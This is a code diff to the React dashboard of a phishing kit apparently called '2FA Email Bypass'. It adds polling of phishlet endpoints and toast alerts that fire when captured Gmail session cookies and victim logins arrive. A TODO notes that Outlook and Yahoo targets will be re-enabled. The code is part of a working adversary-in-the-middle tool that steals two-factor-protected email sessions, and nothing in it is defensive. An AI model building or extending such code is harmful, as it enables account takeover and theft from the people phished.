@@ -5,12 +5,14 @@ import TerminalOutput from "./TerminalOutput";
 import useAsyncAction from "../hooks/useAsyncAction";
 import { getVpsIp } from "../hooks/phishletUrl";
 import authHeaders from "../utils/authHeaders";
+import { useToast } from "../context/ToastContext";
 
 const VPS_IP = getVpsIp();
 const BASE = import.meta.env.VITE_API_URL || "";
 const APP_NAME = import.meta.env.VITE_APP_NAME || "2FA Email Bypass";
 
-const PHISHLET_KEYS = ["gmail", "outlook", "yahoo"];
+// const PHISHLET_KEYS = ["gmail", "outlook", "yahoo"];
+const PHISHLET_KEYS = ["gmail"]; // TODO: uncomment outlook, yahoo after local testing
 
 function timeAgo(iso) {
   if (!iso) return "";
@@ -27,6 +29,7 @@ let tabIdCounter = 0;
 
 export default function Dashboard() {
   const { loading, logs, run, clearLogs } = useAsyncAction();
+  const { addToast } = useToast();
   const [tabs, setTabs] = useState([]);
   const [activeTabId, setActiveTabId] = useState(null);
   const [iframeError, setIframeError] = useState(false);
@@ -34,7 +37,14 @@ export default function Dashboard() {
   const [lastVisit, setLastVisit] = useState(null);
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [activeSection, setActiveSection] = useState("browser");
+  const [notifiedPhishlets, setNotifiedPhishlets] = useState({});
+  const [lastLoginEventTime, setLastLoginEventTime] = useState(() => Date.now() / 1000);
+  const notifiedPhishletsRef = useRef({});
   const iframeRef = useRef(null);
+
+  useEffect(() => {
+    notifiedPhishletsRef.current = notifiedPhishlets;
+  }, [notifiedPhishlets]);
 
   useEffect(() => {
     let cancelled = false;
@@ -46,20 +56,65 @@ export default function Dashboard() {
     async function poll() {
       const candidates = [];
       let failed = false;
-      await Promise.all(
-        PHISHLET_KEYS.map((key) =>
-          axios
-            .get(`${BASE}/api/phishlets/visits`, {
-              params: { key, limit: 1 },
-              headers: authHeaders(),
-            })
-            .then((res) => {
-              const v = (res.data.visits || [])[0];
-              if (v) candidates.push({ key, ...v });
-            })
-            .catch(() => { failed = true; }),
+
+      await Promise.all([
+        Promise.all(
+          PHISHLET_KEYS.map((key) =>
+            axios
+              .get(`${BASE}/api/phishlets/visits`, {
+                params: { key, limit: 1 },
+                headers: authHeaders(),
+              })
+              .then((res) => {
+                const v = (res.data.visits || [])[0];
+                if (v) candidates.push({ key, ...v });
+              })
+              .catch(() => { failed = true; }),
+          )
         ),
-      );
+        Promise.all(
+          PHISHLET_KEYS.map((key) =>
+            axios
+              .get(`${BASE}/api/phishlets/status`, {
+                params: { key },
+                headers: authHeaders(),
+              })
+              .then((res) => {
+                if (cancelled) return;
+                const { key, label, ready, has_cookies, cookie_count, required_count } = res.data;
+                if (has_cookies && !notifiedPhishletsRef.current[key]) {
+                  addToast(`${label} cookies detected! (${cookie_count} found)`, "success", 6000);
+                  setNotifiedPhishlets((prev) => ({ ...prev, [key]: true }));
+                }
+              })
+              .catch(() => {}),
+          )
+        ),
+        axios
+          .get(`${BASE}/api/phishlets/login-events`, {
+            params: { since: lastLoginEventTime },
+            headers: authHeaders(),
+          })
+          .then((res) => {
+            if (cancelled) return;
+            const events = res.data.events || [];
+            if (events.length > 0) {
+              const latestTime = events[events.length - 1].timestamp;
+              const latestDate = new Date(latestTime);
+              setLastLoginEventTime(latestDate.getTime() / 1000);
+              for (const event of events) {
+                if (!notifiedPhishletsRef.current[event.phishlet_key]) {
+                  const phishlet = PHISHLET_KEYS.find(k => k === event.phishlet_key);
+                  const label = phishlet ? phishlet.charAt(0).toUpperCase() + phishlet.slice(1) : event.phishlet_key;
+                  addToast(`${label} login detected! (${event.cookie_count} cookies)`, "success", 8000);
+                  setNotifiedPhishlets((prev) => ({ ...prev, [event.phishlet_key]: true }));
+                }
+              }
+            }
+          })
+          .catch(() => {}),
+      ]);
+
       if (cancelled) return;
       candidates.sort((a, b) => {
         const ta = a.timestamp ? new Date(a.timestamp).getTime() : 0;
@@ -80,7 +135,7 @@ export default function Dashboard() {
       cancelled = true;
       if (timer) clearTimeout(timer);
     };
-  }, []);
+  }, [notifiedPhishlets, addToast, lastLoginEventTime]);
 
   useEffect(() => {
     function handleKeyDown(e) {
